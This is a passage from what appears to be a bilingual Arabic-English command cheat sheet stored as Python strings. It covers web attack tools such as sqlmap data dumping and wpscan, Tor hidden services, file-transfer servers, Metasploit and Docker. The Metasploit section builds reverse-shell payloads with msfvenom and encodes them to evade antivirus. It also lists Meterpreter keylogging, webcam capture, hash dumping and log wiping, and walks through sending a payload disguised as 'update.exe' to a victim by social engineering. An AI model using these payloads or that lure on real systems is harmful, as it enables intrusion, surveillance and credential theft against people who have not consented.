python3 dirsearch.py -u http://example.com -e php,html,txt

# ===== FEROXBUSTER =====
sudo apt install feroxbuster -y

feroxbuster --url http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 20
feroxbuster --url http://example.com -x php,html,txt -t 50

# ===== WORDLISTS =====
# Common wordlist locations
ls /usr/share/wordlists/
ls /usr/share/wordlists/dirb/
ls /usr/share/wordlists/dirbuster/
ls /usr/share/seclists/Discovery/Web-Content/

# Install SecLists
sudo apt install seclists -y

# Rockyou.txt (common passwords)
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# ===== SQL INJECTION TOOLS =====
# SQLMap
sudo apt install sqlmap -y

# Basic usage
sqlmap -u "http://example.com/page.php?id=1"
sqlmap -u "http://example.com/page.php?id=1" --dbs  # Enumerate databases
sqlmap -u "http://example.com/page.php?id=1" -D database --tables  # Enumerate tables
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --columns  # Enumerate columns
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump  # Dump data

# POST request
sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin"

# Request from file
sqlmap -r request.txt

# ===== XSS TOOLS =====
# XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt
python3 xsstrike.py -u "http://example.com/page.php?q=test"

# ===== COMMAND INJECTION =====
# Commix
sudo apt install commix -y
commix --url="http://example.com/page.php?ip=127.0.0.1"

# ===== WEB VULNERABILITY SCANNERS =====
# Nikto
sudo apt install nikto -y
nikto -h http://example.com
nikto -h https://example.com -ssl -port 443

# WPScan (WordPress)
sudo apt install wpscan -y
wpscan --url http://example.com
wpscan --url http://example.com --enumerate u  # Enumerate users
wpscan --url http://example.com --enumerate vp  # Enumerate vulnerabilities

# WhatWeb
sudo apt install whatweb -y
whatweb example.com
whatweb -v example.com  # Verbose

# ===== WEB PROXIES & INTERCEPTION =====
# mitmproxy
sudo apt install mitmproxy -y
mitmproxy --mode transparent
mitmweb  # Web interface

# BetterCap
sudo apt install bettercap -y
sudo bettercap
# Inside bettercap:
# net.probe on
# net.show
# http.proxy on
# https.proxy on

# ===== SSL/TLS TESTING =====
# testssl.sh
git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh
./testssl.sh example.com

# sslyze
pip install sslyze
sslyze example.com

# ===== CONTENT MANAGEMENT SYSTEMS =====
# CMSeeK (CMS Detection)
git clone https://github.com/Tuhinshubhra/CMSeeK.git
cd CMSeeK
python3 cmseek.py -u http://example.com

# Droopescan (Drupal, SilverStripe)
pip install droopescan
droopescan scan drupal -u http://example.com

# ===== API TESTING =====
# Postman (GUI)
# Download from https://www.postman.com/

# Kiterunner (API discovery)
git clone https://github.com/assetnote/kiterunner.git
cd kiterunner
make
./kiterunner brute http://example.com -w /usr/share/wordlists/api.txt

# ===== WORDLIST GENERATION =====
# CeWL (Custom Word List generator)
sudo apt install cewl -y
cewl -d 2 -m 5 http://example.com -w custom_wordlist.txt

# Crunch
sudo apt install crunch -y
crunch 6 20 -t youssef%%%% -o custom.txt  # Generate custom wordlist

# CUPP (Common User Passwords Profiler)
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i  # Interactive mode

# ===== WEB APPLICATION FIREWALL DETECTION =====
# WAFW00F
sudo apt install wafw00f -y
wafw00f http://example.com

# ===== CORS TESTING =====
# Corsy
git clone https://github.com/s0md3v/Corsy.git
cd Corsy
pip3 install -r requirements.txt
python3 corsy.py -u http://example.com

# ===== JWT TOOLS =====
# jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# ===== GRAPHQL TESTING =====
# InQL
git clone https://github.com/doyensec/inql.git
cd inql
pip install -r requirements.txt
python3 inql.py""",
                    "verification": """# Verify installations
ffuf -h
gobuster --help
sqlmap --version
nikto -Version
wpscan --version
whatweb --version""",
                    "example": "ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\nsqlmap -u 'http://example.com/page.php?id=1' --dbs\nnikto -h http://example.com",
                    "notes": "💡 نصائح لاختبار أمان الويب:\n• استخدم Burp Suite/ZAP كـ proxy لتحليل التطبيقات\n• ابدأ بمسح الدلائل (Directory scanning) لاكتشاف المسارات\n• جرب SQL injection و XSS بعد فهم التطبيق\n• استخدم wordlists من SecLists للحصول على نتائج أفضل\n• احترم قوانين الأمن السيبراني واختبر فقط على أجهزتك"
                },
                
                "05. 🌐 Tor & Anonymity (تور وعدم الكشف)": {
                    "code": """# ============ TOR (THE ONION ROUTER) COMMANDS ============
# تثبيت Tor على أنظمة مختلفة

# Debian/Ubuntu
sudo apt update
sudo apt install tor -y
sudo apt install torsocks -y  # لتوجيه أي أمر عبر Tor
sudo apt install nyx -y       # واجهة مراقبة Tor (نصية)

# Fedora/RHEL
sudo dnf install tor
sudo dnf install torsocks

# Arch Linux
sudo pacman -S tor torsocks

# ============ أوامر تشغيل Tor ============
# بدء تشغيل خدمة Tor
sudo systemctl start tor
sudo systemctl enable tor  # تشغيل تلقائي عند الإقلاع

# التحقق من حالة Tor
sudo systemctl status tor
sudo journalctl -u tor -f  # متابعة سجلات Tor في الوقت الفعلي

# إعادة تشغيل Tor
sudo systemctl restart tor

# إيقاف Tor
sudo systemctl stop tor

# ============ استخدام Tor مع التطبيقات ============
# تصفح الإنترنت عبر Tor (باستخدام torsocks)
torsocks firefox  # فتح Firefox عبر شبكة Tor
torsocks curl ifconfig.me  # معرفة IP الخاص بك (سيظهر IP Tor)
torsocks wget https://check.torproject.org/

# استخدام Tor مع apt (لإخفاء تحميلاتك)
sudo torsocks apt update

# استخدام Tor مع ssh
torsocks ssh user@onionaddress.onion

# ============ أوامر Tor (التحكم المباشر) ============
# ملف الإعدادات الرئيسي
sudo nano /etc/tor/torrc

# إعادة تحميل الإعدادات بدون إيقاف الخدمة
sudo systemctl reload tor
sudo kill -HUP $(pidof tor)  # طريقة بديلة

# ============ Tor Bridges (للعبور عبر الحجب) ============
# إضافة جسور في ملف الإعدادات
echo "Bridge obfs4 192.95.36.142:443 $CENSORSHIP_BRIDGE_1" | sudo tee -a /etc/tor/torrc
echo "Bridge obfs4 66.111.2.131:9001 $CENSORSHIP_BRIDGE_2" | sudo tee -a /etc/tor/torrc
echo "UseBridges 1" | sudo tee -a /etc/tor/torrc
sudo systemctl restart tor

# ============ إنشاء خدمة مخفية (Hidden Service) ============
# 1. تعديل ملف الإعدادات
echo "HiddenServiceDir /var/lib/tor/hidden_service/" | sudo tee -a /etc/tor/torrc
echo "HiddenServicePort 80 127.0.0.1:80" | sudo tee -a /etc/tor/torrc
echo "HiddenServicePort 22 127.0.0.1:22" | sudo tee -a /etc/tor/torrc

# 2. إعادة تشغيل Tor
sudo systemctl restart tor

# 3. الحصول على عنوان .onion الخاص بك
sudo cat /var/lib/tor/hidden_service/hostname
# مثال: abcdefg123456.onion

# 4. رؤية مفاتيح الخدمة المخفية
sudo ls -la /var/lib/tor/hidden_service/

# ============ أدوات إضافية للخصوصية ============
# تثبيت Tor Browser (متصفح Tor)
wget https://www.torproject.org/dist/torbrowser/13.0/tor-browser-linux-x86_64-13.0.tar.xz
tar -xvf tor-browser-linux-*.tar.xz
cd tor-browser
./start-tor-browser.desktop

# Tails OS (نظام تشغيل مخصص للخصوصية)
# https://tails.net/install/index.ar.html

# Nyx (مراقبة Tor في الوقت الفعلي)
nyx

# Proxy Chains (توجيه عبر بروكسي متعدد)
sudo apt install proxychains4
sudo nano /etc/proxychains4.conf
# أضف السطر: socks4 127.0.0.1 9050
proxychains4 firefox
proxychains4 nmap -sT -Pn example.com

# ============ اختبار اتصال Tor ============
# اختبار ما إذا كان Tor يعمل
curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip
torsocks curl https://check.torproject.org/ | grep "Congratulations"
torsocks python3 -c "import requests; print(requests.get('https://api.ipify.org').text)" """,
                    "verification": """# أوامر التحقق من Tor
systemctl status tor
journalctl -u tor | grep "Bootstrapped 100%"
curl --socks5 127.0.0.1:9050 https://check.torproject.org/ | grep -o "Congratulations"
torsocks curl ifconfig.me  # قارنها مع curl ifconfig.me
sudo cat /var/lib/tor/hidden_service/hostname  # إذا كنت تدير خدمة مخفية""",
                    "example": """📌 مثال عملي: إخفاء هويتك أثناء التصفح
$ torsocks firefox
$ torsocks curl ifconfig.me
209.165.201.1  # عنوان IP من خوادم Tor

📌 مثال: تشغيل خدمة مخفية (Hidden Service)
$ sudo nano /etc/tor/torrc
  HiddenServiceDir /var/lib/tor/mywebsite/
  HiddenServicePort 80 127.0.0.1:8000
$ sudo systemctl restart tor
$ sudo cat /var/lib/tor/mywebsite/hostname
  abcdefg.onion  # شارك هذا العنوان مع الآخرين للوصول إلى موقعك

📌 مثال: استخدام Tor مع nmap لفحص شبكة بشكل مجهول
$ proxychains4 nmap -sT -Pn -p 80,443 example.com""",
                    "notes": "⚠️ مهم: Tor لا يضمن عدم الكشف المطلق. استخدمه مع ممارسات أمان أخرى.\n🔐 تأكد دائماً من تحديث Tor: sudo apt update && sudo apt upgrade tor\n🌐 المنفذ الافتراضي لـ SOCKS: 127.0.0.1:9050\n🚀 للحصول على أداء أفضل، استخدم Bridges في البلدان التي تحجب Tor.",
                },              
                "06. 📡 File Transfer Servers (خوادم نقل الملفات)": {
                    "code": """# ============ خوادم نقل الملفات - File Transfer Servers ============

# ============ 1. PYTHON HTTP SERVER (أسهل وأسرع طريقة) ============
# Python 3
python3 -m http.server 8000
python3 -m http.server 8080 --bind 0.0.0.0  # استقبال من جميع الواجهات
python3 -m http.server 8000 --directory /path/to/folder  # مجلد محدد

# Python 2 (إذا كان مثبتاً)
python -m SimpleHTTPServer 8000

# مع تمكين الوصول من الشبكة الخارجية
python3 -m http.server 8000 --bind 0.0.0.0
# ثم افتح المنفذ في جدار الحماية:
sudo ufw allow 8000/tcp
sudo iptables -A INPUT -p tcp --dport 8000 -j ACCEPT

# مع دعم التحميل (Upload) باستخدام وحدة إضافية
# تثبيت الوحدة
pip install uploadserver
# تشغيل السيرفر مع دعم الرفع
python3 -m uploadserver 8000
python3 -m uploadserver 8000 --directory /path/to/uploads  # تحديد مجلد الرفع

# ============ 2. FTP SERVER (بروتوكول نقل الملفات) ============
# تثبيت FTP
sudo apt update
sudo apt install vsftpd -y  # Very Secure FTP Daemon

# إعدادات vsftpd
sudo nano /etc/vsftpd.conf
# الإعدادات الأساسية:
\"\"\"
anonymous_enable=NO
local_enable=YES
write_enable=YES
local_umask=0o22
dirmessage_enable=YES
xferlog_enable=YES
connect_from_port_20=YES
xferlog_std_format=YES
chroot_local_user=YES
allow_writeable_chroot=YES
listen=YES
listen_ipv6=NO
pam_service_name=vsftpd
userlist_enable=YES
userlist_file=/etc/vsftpd.userlist
userlist_deny=NO
\"\"\"

# إضافة مستخدمين مسموح لهم
sudo nano /etc/vsftpd.userlist
# أضف أسماء المستخدمين (واحد لكل سطر)
# user1
# user2

# بدء تشغيل FTP
sudo systemctl start vsftpd
sudo systemctl enable vsftpd
sudo systemctl status vsftpd

# الاتصال بخادم FTP
ftp localhost
ftp 192.168.1.100
lftp user@192.168.1.100  # أداة أفضل مع ميزات إضافية

# تثبيت عميل FTP
sudo apt install ftp lftp -y

# ============ 3. HTTP SERVER مع واجهة رسومية (SimpleHTTPServer GUI) ============
# تثبيت darkhttpd (خفيف جداً)
sudo apt install darkhttpd -y
darkhttpd /path/to/serve --port 8080
darkhttpd . --port 8000 --daemon  # تشغيل في الخلفية

# ============ 4. RSYNC SERVER (مزامنة الملفات) ============
# تثبيت rsync daemon
sudo apt install rsync -y

# إعداد rsync daemon
sudo nano /etc/rsyncd.conf
\"\"\"
uid = nobody
gid = nogroup
use chroot = yes
max connections = 10
pid file = /var/run/rsyncd.pid
log file = /var/log/rsync.log

[public]
    path = /srv/rsync/public
    comment = Public Files
    read only = yes
    list = yes

[private]
    path = /srv/rsync/private
    comment = Private Files
    read only = no
    list = no
    auth users = user1
    secrets file = /etc/rsyncd.secrets
\"\"\"

# إنشاء ملف كلمات السر
sudo nano /etc/rsyncd.secrets
# user1:password123
sudo chmod 600 /etc/rsyncd.secrets

# بدء تشغيل rsync daemon
sudo systemctl start rsync
sudo systemctl enable rsync

# استخدام rsync client
rsync -avz user@server::private/ /local/dir/
rsync -avz /local/dir/ user@server::public/
rsync -avz -e ssh user@server:/remote/path /local/path  # عبر SSH

# ============ 5. NFS (Network File System) ============
# تثبيت NFS server
sudo apt install nfs-kernel-server -y

# إعداد المشاركات
sudo nano /etc/exports
\"\"\"
/srv/nfs/share 192.168.1.0/24(rw,sync,no_subtree_check)
/srv/nfs/public *(ro,sync,no_subtree_check)
/home/user/shared 192.168.1.100(rw,no_root_squash)
\"\"\"

# إنشاء المجلدات وتحديد الصلاحيات
sudo mkdir -p /srv/nfs/share
sudo chown nobody:nogroup /srv/nfs/share
sudo chmod 755 /srv/nfs/share

# تطبيق الإعدادات
sudo exportfs -a
sudo systemctl restart nfs-kernel-server
sudo showmount -e  # عرض المشاركات

# الاتصال من عميل NFS
sudo apt install nfs-common -y
sudo mount -t nfs 192.168.1.100:/srv/nfs/share /mnt/nfs
# للإبقاء دائماً:
echo "192.168.1.100:/srv/nfs/share /mnt/nfs nfs defaults 0 0" | sudo tee -a /etc/fstab

# ============ 6. CURL & WGET COMMANDS (تنزيل ورفع) ============
# تنزيل ملف
wget https://example.com/file.zip
curl -O https://example.com/file.zip

# تنزيل مع اسم مختلف
wget -O newname.zip https://example.com/file.zip
curl -o newname.zip https://example.com/file.zip

# استئناف تنزيل متقطع
wget -c https://example.com/largefile.iso
curl -C - -O https://example.com/largefile.iso

# رفع ملف (POST request)
curl -F "file=@localfile.txt" https://file.io  # خدمة مؤقتة
curl -T localfile.txt ftp://server.com/ --user username:password

# تنزيل مجلد كامل
wget -r -np -nH --cut-dirs=1 -R "index.html*" https://example.com/files/

# ============ 7. NETCAT (NC) - السكين السويسري للشبكات ============
# نقل ملف عبر Netcat (بسيط جداً)
# على المستقبل:
nc -l -p 1234 > received_file.txt
# على المرسل:
nc 192.168.1.100 1234 < file_to_send.txt

# نقل مجلد كامل (مع tar)
# على المستقبل:
nc -l -p 1234 | tar -xzvf -
# على المرسل:
tar -czvf - /path/to/folder | nc 192.168.1.100 1234

# ============ 8. SCP & SFTP (آمن عبر SSH) ============
# نسخ ملف إلى خادم بعيد
scp file.txt user@192.168.1.100:/home/user/
scp -r folder/ user@192.168.1.100:/home/user/  # مجلد كامل
scp -P 2222 file.txt user@192.168.1.100:/home/user/  # منفذ مختلف

# نسخ من خادم بعيد إلى المحلي
scp user@192.168.1.100:/home/user/file.txt .
scp -r user@192.168.1.100:/home/user/folder/ .

# SFTP (جلسة تفاعلية)
sftp user@192.168.1.100
# أوامر داخل sftp:
# ls, cd, get file, put file, rm, mkdir, exit

# ============ 9. HTTP SERVER مع PHP ============
# تشغيل سيرفر PHP المدمج
php -S 0.0.0.0:8000 -t /path/to/webroot
php -S 0.0.0.0:8000  # المجلد الحالي

# مع تمكين التحميل (إنشاء ملف upload.php)
echo '<?php move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]); ?>' > upload.php
# ثم استخدم curl لرفع الملفات:
curl -F "file=@localfile.txt" http://localhost:8000/upload.php

# ============ 10. QR CODE GENERATION (إنشاء رموز QR) ============
# تثبيت أدوات QR
sudo apt install qrencode -y
sudo apt install zbar-tools -y  # لقراءة QR
pip install qrcode[pil]  # Python library

# إنشاء QR Code من نص
echo "Hello World" | qrencode -o hello.png
qrencode -o website.png "https://example.com"
qrencode -s 10 -o large.png "Large size QR"  # حجم أكبر

# إنشاء QR من ملف
cat file.txt | qrencode -o fileqr.png
qrencode -o wifi.png "WIFI:S:MyNetwork;T:WPA;P:password123;;"  # رمز Wi-Fi

# إنشاء QR لاتصال SSH
qrencode -o ssh.png "ssh user@192.168.1.100"

# قراءة QR من صورة
zbarimg qrcode.png
zbarimg -q --raw qrcode.png  # إخراج خام بدون تفاصيل

# قراءة QR من الكاميرا (تثبيت)
sudo apt install zbarcam-gtk -y
zbarcam-gtk  # يفتح الكاميرا ويقرأ QR مباشرة

# Python script لإنشاء QR
python3 -c "
import qrcode
img = qrcode.make('https://example.com')
img.save('qrcode.png')
print('QR code saved as qrcode.png')
" """,
                    "verification": """# التحقق من السيرفرات
ss -tulpn | grep ':8000\\|:21\\|:2049'  # التحقق من المنافذ المفتوحة
curl http://localhost:8000  # اختبار HTTP server
ftp localhost  # اختبار FTP
showmount -e localhost  # عرض مشاركات NFS
rsync user@localhost::  # عرض وحدات rsync المتاحة""",
                    "example": """📌 مثال: مشاركة مجلد سريعاً عبر Python
$ cd /path/to/share
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
# الآن يمكن لأي شخص في الشبكة الوصول عبر http://your-ip:8000

📌 مثال: نقل ملف كبير عبر netcat
# الطرف المستقبل:
$ nc -l -p 1234 > bigfile.iso
# الطرف المرسل:
$ nc 192.168.1.50 1234 < bigfile.iso

📌 مثال: إنشاء QR لاتصال Wi-Fi
$ qrencode -o wifi.png "WIFI:S:MyWiFi;T:WPA;P:MyPassword123;;"
# امسح الرمز من هاتفك للاتصال تلقائياً""",
                    "notes": "💡 نصائح مهمة:\n• افتح المنافذ في جدار الحماية: sudo ufw allow 8000\n• للاستخدام المؤقت، Python HTTP server هو الأسهل.\n• لنقل ملفات كبيرة، استخدم rsync أو netcat.\n• تأكد من أمان الملفات المنقولة، خاصة عبر FTP (غير مشفر).\n• يمكن دمج QR مع أي أمر لإنشاء روابط سريعة."
                },
                
                "07. 🛡️ Metasploit Framework (إطار عمل الاختراق الأخلاقي)": {
                    "code": """# ============ METASPLOIT FRAMEWORK (MSF) ============
# إطار عمل Metasploit للاختبارات الأمنية والاختراق الأخلاقي

# ============ تثبيت Metasploit ============
# على Kali Linux (مثبت مسبقاً)
msfconsole --version

# تثبيت على Debian/Ubuntu
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
sudo ./msfinstall

# أو عبر apt (إصدار قديم)
sudo apt update
sudo apt install metasploit-framework -y

# تحديث Metasploit
sudo msfupdate
msfupdate  # داخل msfconsole

# ============ تشغيل Metasploit ============
# تشغيل وحدة التحكم الرئيسية
sudo msfconsole
msfconsole -q  # وضع هادئ (بدون banner)
msfconsole -r script.rc  # تشغيل سكربت أوامر

# أوامر أساسية داخل msfconsole
help              # عرض المساعدة
version           # عرض الإصدار
banner            # عرض الشعار
color             # تفعيل/تعطيل الألوان
exit              # الخروج

# ============ البحث عن الوحدات (Modules) ============
# البحث بكلمة مفتاحية
search type:exploit platform:windows ms17-010
search name:apache
search cve:2021
search type:auxiliary scanner
search smb

# استخدام وحدة
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/portscan/tcp
use payload/windows/x64/meterpreter/reverse_tcp

# معلومات عن الوحدة
info
show options
show targets
show payloads
show advanced

# تعيين الخيارات
set RHOSTS 192.168.1.100
set RPORT 445
set LHOST 192.168.1.50
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# تعيين خيارات متعددة من ملف
# إنشاء ملف options.rc:
\"\"\"
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
\"\"\"
msfconsole -r options.rc -q

# ============ تشغيل exploits ============
# التحقق من الهدف (Check)
check

# تنفيذ الاستغلال
exploit
run
exploit -j  # تشغيل في الخلفية كـ job
sessions -l  # عرض الجلسات النشطة
sessions -i 1  # التفاعل مع جلسة معينة

# ============ Meterpreter (المرحلة المتقدمة) ============
# بعد الحصول على جلسة Meterpreter
help                  # أوامر Meterpreter
sysinfo               # معلومات النظام
getuid                # معرف المستخدم
getpid                # معرف العملية
ps                    # قائمة العمليات
migrate PID           # الانتقال إلى عملية أخرى
shell                 # فتح شل نظام
execute -f cmd.exe -i  # تنفيذ أمر
download file.txt     # تحميل ملف من الهدف
upload exploit.exe    # رفع ملف إلى الهدف
screenshot            # أخذ لقطة شاشة
webcam_list           # قائمة كاميرات الويب
webcam_snap           # التقاط صورة من الكاميرا
keyscan_start         # بدء تسجيل ضغطات المفاتيح
keyscan_dump          # عرض ضغطات المفاتيح المسجلة
hashdump              # استخراج hashes كلمات السر
clearev               # مسح السجلات
background            # إرسال الجلسة للخلفية
exit                  # إنهاء الجلسة

# ============ إنشاء Payloads (حمولات) ============
# msfvenom (أداة إنشاء الحمولات)
msfvenom -l payloads
msfvenom -l encoders
msfvenom -l formats

# Windows payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload64.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Linux payloads
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# Web payloads
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o payload.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o payload.jsp
msfvenom -p python/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o payload.py

# Android payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk

# MacOS payload
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o payload.macho

# تشفير الحمولة لتجنب الاكتشاف
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe

# ============ Auxiliary Modules (وحدات مساعدة) ============
# ماسحات المنافذ
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 50
run

# ماسح SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# ماسح HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# ماسح FTP
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.100-150
run

# جمع معلومات DNS
use auxiliary/gather/dns_enum
set DOMAIN example.com
run

# ============ Post-Exploitation (بعد الاختراق) ============
# جمع المعلومات
use post/windows/gather/enum_logged_on_users
use post/linux/gather/enum_configs
use post/multi/gather/env

# تصعيد الصلاحيات
use exploit/windows/local/bypassuac
use exploit/linux/local/cve_2021_3157

# الحفاظ على الوصول (Persistence)
use exploit/windows/local/persistence
use exploit/linux/local/persistence_service

# ============ Databases في Metasploit ============
# إعداد قاعدة البيانات
msfdb init
msfdb status
db_status  # داخل msfconsole

# استخدام قاعدة البيانات
hosts
services
vulns
loot
creds

# استيراد نتائج Nmap
db_import scan.xml
nmap -sV -O 192.168.1.0/24 -oA scan  # ثم import

# ============ Workspaces (مساحات العمل) ============
workspace              # عرض المساحات
workspace -a pentest1  # إضافة مساحة جديدة
workspace pentest1     # التبديل إلى مساحة
workspace -d pentest1  # حذف مساحة

# ============ Resource Scripts (سكربتات أوامر) ============
# إنشاء سكربت auto.rc
\"\"\"
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set ExitOnSession false
exploit -j -z
\"\"\"
msfconsole -r auto.rc

# ============ Armitage (واجهة رسومية لـ Metasploit) ============
# تثبيت Armitage
sudo apt install armitage -y
armitage  # تشغيل الواجهة الرسومية
# ثم اضغط Connect

# ============ أمثلة عملية ============
# مثال 1: استغلال ثغرة EternalBlue (MS17-010)
\"\"\"
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
\"\"\"

# مثال 2: إنشاء Payload وتشغيل listener
\"\"\"
# Terminal 1: إنشاء الـ payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Terminal 2: تشغيل listener في msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit
\"\"\"

# مثال 3: مسح الشبكة وجمع المعلومات
\"\"\"
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50
msf6 auxiliary(scanner/portscan/tcp) > run

msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_version) > run
\"\"\" """,
                    "verification": """# التحقق من التثبيت والتشغيل
msfconsole --version
msfvenom --version
msfdb status

# داخل msfconsole
db_status
workspace
hosts
sessions -l""",
                    "example": """📌 مثال عملي: اختبار اختراق جهاز Windows ضعيف
1. إنشاء الحمولة:
   $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o update.exe

2. إرسال الملف للضحية (هندسة اجتماعية)

3. تشغيل المستمع:
   $ msfconsole -q
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
   msf6 exploit(multi/handler) > set LHOST 192.168.1.50
   msf6 exploit(multi/handler) > set LPORT 4444
   msf6 exploit(multi/handler) > exploit

4. عند الاتصال:
   meterpreter > sysinfo
   meterpreter > getuid
   meterpreter > screenshot
   meterpreter > shell""",
                    "notes": "⚠️ تنبيهات مهمة جداً:\n• استخدم Metasploit فقط على أجهزتك أو بإذن كتابي.\n• Metasploit أداة قوية جداً، قد تكون غير قانونية إذا استخدمت بشكل خاطئ.\n• تأكد دائماً من تحديث Metasploit: sudo msfupdate\n• للتدريب، استخدم بيئات معزولة مثل VirtualBox مع أجهزة ضعيفة.\n• بعض الانتي فيروسات تكتشف Payloads، استخدم encoding أو packing."
                },
                
                "08. 🐳 Docker & Containerization (الحاويات)": {
                    "code": """# ============ DOCKER COMMANDS (أوامر دوكر) ============

# ============ تثبيت Docker ============
# Ubuntu/Debian
sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker

# أو الطريقة الرسمية
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# تثبيت Docker Compose
sudo apt install docker-compose -y
# أو
sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose

# إضافة المستخدم لمجموعة docker (لتشغيل بدون sudo)
sudo usermod -aG docker $USER
# سجل خروج ثم دخول مرة أخرى

# التحقق من التثبيت
docker --version
docker-compose --version
docker info

# ============ أوامر الصور (Images) ============
# سحب صورة
docker pull ubuntu:latest
docker pull nginx
docker pull python:3.9-slim
docker pull mysql:8.0

# عرض الصور المحلية
docker images
docker image ls
docker image ls -a  # كل الصور

# حذف صورة
docker rmi image_name
docker rmi image_id
docker image prune  # حذف الصور غير المستخدمة
docker image prune -a  # حذف كل الصور غير المستخدمة

# إنشاء صورة من Dockerfile
docker build -t myapp:1.0 .
docker build -t myapp:latest -f Dockerfile.prod .
docker build --no-cache -t myapp:1.0 .  # بدون استخدام cache

# حفظ وتحميل الصور
docker save -o myapp.tar myapp:1.0
docker load -i myapp.tar

# دفع الصورة إلى registry
docker tag myapp:1.0 username/myapp:1.0
docker push username/myapp:1.0

# سحب صورة من registry
docker pull username/myapp:1.0

# ============ أوامر الحاويات (Containers) ============
# تشغيل حاوية
docker run nginx
docker run -it ubuntu bash  # تفاعلي مع bash
docker run -d nginx  # في الخلفية (detached)
docker run --name mynginx -d nginx  # باسم محدد
docker run -p 8080:80 nginx  # ربط المنفذ 8080 المحلي بـ 80 في الحاوية
docker run -v /host/folder:/container/folder nginx  # ربط مجلد
docker run --rm nginx  # حذف الحاوية بعد الإيقاف

# تشغيل مع متغيرات بيئة
docker run -e MYSQL_ROOT_PASSWORD=secret mysql
docker run --env-file .env nginx

# عرض الحاويات
docker ps
docker ps -a  # كل الحاويات (حتى المتوقفة)
docker container ls
docker container ls -a

# إيقاف وبدء الحاويات
docker stop container_id
docker start container_id
docker restart container_id

# إيقاف كل الحاويات
docker stop $(docker ps -q)

# الدخول إلى حاوية عاملة
docker exec -it container_id bash
docker exec -it container_id sh
docker exec container_id ls -la

# عرض سجلات الحاوية
docker logs container_id
docker logs -f container_id  # متابعة السجلات (tail -f)
docker logs --tail 50 container_id  # آخر 50 سطر

# نسخ ملفات من/إلى الحاوية
docker cp file.txt container_id:/path/
docker cp container_id:/path/file.txt .

# حذف حاوية
docker rm container_id
docker rm -f container_id  # قوة (حتى لو عاملة)
docker container prune  # حذف كل الحاويات المتوقفة

# معلومات الحاوية
docker inspect container_id
docker stats  # استخدام الموارد
docker top container_id  # العمليات داخل الحاوية

